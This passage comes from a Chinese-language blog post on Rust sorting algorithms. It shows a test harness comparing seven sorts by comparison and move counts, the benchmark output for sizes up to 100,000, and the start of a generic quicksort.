            <span class="token keyword">let</span> origin<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>_<span class="token closure-punctuation punctuation">|</span></span> rng<span class="token punctuation">.</span><span class="token function">random_range</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10000</span><span class="token punctuation">..</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> sorted_std <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> v <span class="token operator">=</span> origin<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                v<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                v
            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

            <span class="token comment">// 定义算法列表：(名称, 执行闭包)</span>
            <span class="token comment">// 使用 Box&lt;dyn Fn...> 来统一不同函数签名的调用</span>
            <span class="token keyword">let</span> algorithms<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token keyword">dyn</span> <span class="token class-name">Fn</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Sort</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>
                <span class="token punctuation">(</span><span class="token string">"插入排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">insert_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">(</span><span class="token string">"希尔排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">shell_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">(</span><span class="token string">"冒泡排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">bubble_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">(</span><span class="token string">"选择排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">select_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">(</span><span class="token string">"堆排序  "</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">heap_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">(</span><span class="token string">"快速排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">let</span> l <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> l <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span> s<span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">(</span><span class="token string">"归并排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">let</span> l <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> l <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span> s<span class="token punctuation">.</span><span class="token function">merge_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> func<span class="token punctuation">)</span> <span class="token keyword">in</span> algorithms <span class="token punctuation">&#123;</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> data <span class="token operator">=</span> origin<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> sort_instance <span class="token operator">=</span> <span class="token class-name">Sort</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 每次新建实例</span>

                <span class="token comment">// 执行排序</span>
                <span class="token function">func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> sort_instance<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">// 验证结果 (使用标准库排序结果作为基准)</span>
                <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> sorted_std<span class="token punctuation">,</span> <span class="token string">"&#123;&#125; 结果不正确!"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">// 打印结果 (格式化对齐)</span>
                <span class="token macro property">info!</span><span class="token punctuation">(</span>
                    <span class="token string">"算法: &#123;&#125; | 比较: &#123;:>9&#125; | 移动: &#123;:>9&#125;"</span><span class="token punctuation">,</span>
                    name<span class="token punctuation">,</span>
                    sort_instance<span class="token punctuation">.</span>bench<span class="token punctuation">.</span>compare_time<span class="token punctuation">,</span>
                    sort_instance<span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time
                <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/*
    fn verify_sort(num : Vec&lt;i32>, sorted : Vec&lt;i32>) -> Result&lt;(), String>&#123;
        if num.len() != sorted.len() &#123;
            return Err("长度不相等".to_string());
        &#125;

        // 检查排序后的数组是否有序
        for i in 1..sorted.len() &#123;
            if sorted[i] &lt; sorted[i - 1] &#123;
                return Err("排序后数组存在逆序".to_string());
            &#125;
        &#125;

        // 检查两个数组是否包含相同的元素（顺序可以不同）
        let mut num_sorted = num.clone();
        num_sorted.sort();

        if num_sorted == sorted &#123;
           Ok(())
        &#125;else&#123;
            Err("数组不相等".to_string())
        &#125;
    &#125;
    */</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行结果：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">running <span class="token number">1</span> <span class="token builtin class-name">test</span>
<span class="token number">2025</span>-12-22T05:01:19.791577Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">1</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">100</span> <span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">2025</span>-12-22T05:01:19.792588Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较:    <span class="token number">2702</span> <span class="token operator">|</span> 移动:    <span class="token number">2609</span>
<span class="token number">2025</span>-12-22T05:01:19.793373Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:    <span class="token number">1145</span> <span class="token operator">|</span> 移动:     <span class="token number">781</span>
<span class="token number">2025</span>-12-22T05:01:19.794736Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较:    <span class="token number">4905</span> <span class="token operator">|</span> 移动:    <span class="token number">7536</span>
<span class="token number">2025</span>-12-22T05:01:19.796295Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较:    <span class="token number">4950</span> <span class="token operator">|</span> 移动:     <span class="token number">282</span>
<span class="token number">2025</span>-12-22T05:01:19.797076Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:    <span class="token number">1027</span> <span class="token operator">|</span> 移动:    <span class="token number">1746</span>
<span class="token number">2025</span>-12-22T05:01:19.797772Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:     <span class="token number">727</span> <span class="token operator">|</span> 移动:    <span class="token number">1095</span>
<span class="token number">2025</span>-12-22T05:01:19.798186Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:     <span class="token number">549</span> <span class="token operator">|</span> 移动:    <span class="token number">1292</span>
<span class="token number">2025</span>-12-22T05:01:19.798396Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">2</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">500</span> <span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">2025</span>-12-22T05:01:19.803050Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较:   <span class="token number">62463</span> <span class="token operator">|</span> 移动:   <span class="token number">61970</span>
<span class="token number">2025</span>-12-22T05:01:19.804701Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:   <span class="token number">13345</span> <span class="token operator">|</span> 移动:   <span class="token number">11392</span>
<span class="token number">2025</span>-12-22T05:01:19.818697Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较:  <span class="token number">124372</span> <span class="token operator">|</span> 移动:  <span class="token number">184407</span>
<span class="token number">2025</span>-12-22T05:01:19.821945Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较:  <span class="token number">124750</span> <span class="token operator">|</span> 移动:    <span class="token number">1485</span>
<span class="token number">2025</span>-12-22T05:01:19.822856Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:    <span class="token number">7440</span> <span class="token operator">|</span> 移动:   <span class="token number">12117</span>
<span class="token number">2025</span>-12-22T05:01:19.823920Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:    <span class="token number">5113</span> <span class="token operator">|</span> 移动:    <span class="token number">9120</span>
<span class="token number">2025</span>-12-22T05:01:19.824957Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:    <span class="token number">3856</span> <span class="token operator">|</span> 移动:    <span class="token number">8694</span>
<span class="token number">2025</span>-12-22T05:01:19.825448Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">3</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">1000</span> <span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">2025</span>-12-22T05:01:19.839718Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较:  <span class="token number">256070</span> <span class="token operator">|</span> 移动:  <span class="token number">255078</span>
<span class="token number">2025</span>-12-22T05:01:19.843516Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:   <span class="token number">54399</span> <span class="token operator">|</span> 移动:   <span class="token number">50467</span>
<span class="token number">2025</span>-12-22T05:01:19.879929Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较:  <span class="token number">498905</span> <span class="token operator">|</span> 移动:  <span class="token number">762174</span>
<span class="token number">2025</span>-12-22T05:01:19.891824Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较:  <span class="token number">499500</span> <span class="token operator">|</span> 移动:    <span class="token number">2982</span>
<span class="token number">2025</span>-12-22T05:01:19.894710Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:   <span class="token number">16804</span> <span class="token operator">|</span> 移动:   <span class="token number">27147</span>
<span class="token number">2025</span>-12-22T05:01:19.895870Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:   <span class="token number">10949</span> <span class="token operator">|</span> 移动:   <span class="token number">14496</span>
<span class="token number">2025</span>-12-22T05:01:19.897454Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:    <span class="token number">8709</span> <span class="token operator">|</span> 移动:   <span class="token number">19296</span>
<span class="token number">2025</span>-12-22T05:01:19.898132Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">4</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">2000</span> <span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">2025</span>-12-22T05:01:19.943426Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较:  <span class="token number">970591</span> <span class="token operator">|</span> 移动:  <span class="token number">968597</span>
<span class="token number">2025</span>-12-22T05:01:19.949645Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:  <span class="token number">156710</span> <span class="token operator">|</span> 移动:  <span class="token number">148767</span>
<span class="token number">2025</span>-12-22T05:01:20.075452Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较: <span class="token number">1998790</span> <span class="token operator">|</span> 移动: <span class="token number">2899533</span>
<span class="token number">2025</span>-12-22T05:01:20.126713Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较: <span class="token number">1999000</span> <span class="token operator">|</span> 移动:    <span class="token number">5973</span>
<span class="token number">2025</span>-12-22T05:01:20.129949Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:   <span class="token number">37755</span> <span class="token operator">|</span> 移动:   <span class="token number">60588</span>
<span class="token number">2025</span>-12-22T05:01:20.132023Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:   <span class="token number">25649</span> <span class="token operator">|</span> 移动:   <span class="token number">38115</span>
<span class="token number">2025</span>-12-22T05:01:20.134511Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:   <span class="token number">19412</span> <span class="token operator">|</span> 移动:   <span class="token number">42698</span>
<span class="token number">2025</span>-12-22T05:01:20.134763Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">5</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">5000</span> <span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">2025</span>-12-22T05:01:20.396978Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较: <span class="token number">6203283</span> <span class="token operator">|</span> 移动: <span class="token number">6198287</span>
<span class="token number">2025</span>-12-22T05:01:20.444421Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:  <span class="token number">918591</span> <span class="token operator">|</span> 移动:  <span class="token number">898657</span>
<span class="token number">2025</span>-12-22T05:01:21.271658Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较: <span class="token number">12496639</span> <span class="token operator">|</span> 移动: <span class="token number">18577998</span>
<span class="token number">2025</span>-12-22T05:01:21.593931Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较: <span class="token number">12497500</span> <span class="token operator">|</span> 移动:   <span class="token number">14982</span>
<span class="token number">2025</span>-12-22T05:01:21.600998Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:  <span class="token number">107656</span> <span class="token operator">|</span> 移动:  <span class="token number">171342</span>
<span class="token number">2025</span>-12-22T05:01:21.605011Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:   <span class="token number">68277</span> <span class="token operator">|</span> 移动:  <span class="token number">100923</span>
<span class="token number">2025</span>-12-22T05:01:21.610876Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:   <span class="token number">55199</span> <span class="token operator">|</span> 移动:  <span class="token number">120893</span>
<span class="token number">2025</span>-12-22T05:01:21.611331Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">6</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">10000</span> <span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">2025</span>-12-22T05:01:22.675283Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较: <span class="token number">24842700</span> <span class="token operator">|</span> 移动: <span class="token number">24832712</span>
<span class="token number">2025</span>-12-22T05:01:22.817031Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较: <span class="token number">3423814</span> <span class="token operator">|</span> 移动: <span class="token number">3383885</span>
<span class="token number">2025</span>-12-22T05:01:26.095848Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较: <span class="token number">49978529</span> <span class="token operator">|</span> 移动: <span class="token number">74460552</span>
<span class="token number">2025</span>-12-22T05:01:27.326666Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较: <span class="token number">49995000</span> <span class="token operator">|</span> 移动:   <span class="token number">29973</span>
<span class="token number">2025</span>-12-22T05:01:27.342937Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:  <span class="token number">235350</span> <span class="token operator">|</span> 移动:  <span class="token number">372729</span>
<span class="token number">2025</span>-12-22T05:01:27.352162Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:  <span class="token number">146882</span> <span class="token operator">|</span> 移动:  <span class="token number">225297</span>
<span class="token number">2025</span>-12-22T05:01:27.364114Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:  <span class="token number">120507</span> <span class="token operator">|</span> 移动:  <span class="token number">261739</span>
<span class="token number">2025</span>-12-22T05:01:27.364474Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">7</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">100000</span> <span class="token operator">==</span><span class="token operator">=</span>
<span class="token builtin class-name">test</span> test::test_sort has been running <span class="token keyword">for</span> over <span class="token number">60</span> seconds
<span class="token number">2025</span>-12-22T05:03:33.557852Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较: <span class="token number">2489615146</span> <span class="token operator">|</span> 移动: <span class="token number">2489515158</span>
<span class="token number">2025</span>-12-22T05:03:47.811176Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较: <span class="token number">323937261</span> <span class="token operator">|</span> 移动: <span class="token number">323537347</span>
<span class="token number">2025</span>-12-22T05:11:05.291893Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较: <span class="token number">4999918875</span> <span class="token operator">|</span> 移动: <span class="token number">7467497442</span>
<span class="token number">2025</span>-12-22T05:13:36.252963Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较: <span class="token number">4999950000</span> <span class="token operator">|</span> 移动:  <span class="token number">299970</span>
<span class="token number">2025</span>-12-22T05:13:36.433015Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较: <span class="token number">3019688</span> <span class="token operator">|</span> 移动: <span class="token number">4725597</span>
<span class="token number">2025</span>-12-22T05:13:36.563771Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较: <span class="token number">1994351</span> <span class="token operator">|</span> 移动: <span class="token number">2669799</span>
<span class="token number">2025</span>-12-22T05:13:36.738450Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较: <span class="token number">1536095</span> <span class="token operator">|</span> 移动: <span class="token number">3282766</span>
<span class="token builtin class-name">test</span> test::test_sort <span class="token punctuation">..</span>. ok
<span class="token builtin class-name">test</span> test::test_sort <span class="token punctuation">..</span>. ok

<span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">736</span>.95s

     Running unittests src<span class="token punctuation">\</span>main.rs <span class="token punctuation">(</span>target<span class="token punctuation">\</span>debug<span class="token punctuation">\</span>deps<span class="token punctuation">\</span>ex7-c62cfa010482da9d.exe<span class="token punctuation">)</span>

running <span class="token number">0</span> tests

<span class="token builtin class-name">test</span> result: ok. <span class="token number">0</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">0</span>.00s

   Doc-tests ex7

running <span class="token number">0</span> tests

<span class="token builtin class-name">test</span> result: ok. <span class="token number">0</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">0</span>.00s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>对于最后一组，十万数据的排序测试，冒泡排序跑了7分多钟，居然这么慢，插入排序和选择排序跑了两分多钟</p>
<p>shell排序因为步长很短，效果并不好，但是可以优化</p>
<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>一道排序算法模板题，但是没有标准库可用，同时要求输出时附带名次且同分同名</p>
<p>既然测试的结果快排最好，那接下来就在快排的基础上改，首先把它变成一个泛型函数：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">quick_sort</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span>
<span class="token keyword">where</span>
    <span class="token class-name">T</span> <span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span> <span class="token operator">+</span> <span class="token class-name">Clone</span><span class="token punctuation">,</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> high <span class="token operator">></span> low <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> pi <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> pi <span class="token operator">></span> low <span class="token punctuation">&#123;</span> <span class="token comment">// 避免pi = 0发生溢出的情况</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> pi <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> pi <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

